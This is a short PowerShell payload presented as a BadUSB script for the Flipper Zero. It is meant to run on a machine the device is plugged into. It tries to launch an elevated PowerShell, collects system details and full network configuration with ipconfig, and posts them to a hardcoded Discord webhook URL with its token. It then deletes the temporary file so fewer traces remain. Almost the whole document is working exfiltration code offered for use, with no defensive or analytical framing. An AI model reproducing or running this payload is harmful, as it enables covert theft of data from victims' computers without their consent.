# BadUSB script example for Flipper Zero - "BadKB"
# This script will open PowerShell as administrator, gather system information, save it to a file, and send it to a Discord WebHook

Start-Sleep -Milliseconds 1000
# Delay to ensure the computer has time to recognize the device

Start-Process PowerShell -ArgumentList '-Command "Start-Process PowerShell -Verb RunAs"' -Wait
# Run PowerShell as Administrator and wait for the process to start

Start-Sleep -Milliseconds 2000
# Wait for the UAC prompt to appear and confirm

# Note: User might need to confirm the UAC prompt manually (depending on system language)

Start-Sleep -Milliseconds 1500

try {
    $webhookUrl = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'
    # Set the Discord WebHook URL

    $sysInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object CSName, Version, BuildNumber, TotalVisibleMemorySize
    # Get basic system information

    $ipConfig = ipconfig /all
    # Get detailed network configuration

    $filePath = "$env:TEMP\sysinfo.txt"
    # Set the file path to save system information

    "$sysInfo`n`n$ipConfig" | Out-File -FilePath $filePath -Encoding UTF8
    # Save the gathered information to a file with UTF8 encoding

    $content = Get-Content -Path $filePath -Raw
    # Read the content of the file to a variable

    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$content} | ConvertTo-Json)
    # Send the gathered information to the Discord WebHook

    Remove-Item -Path $filePath
    # Remove the file after sending
}
catch {
    Write-Error "An error occurred: $_"
    # Catch and display any errors that occur during execution
}

Exit
# Close PowerShell
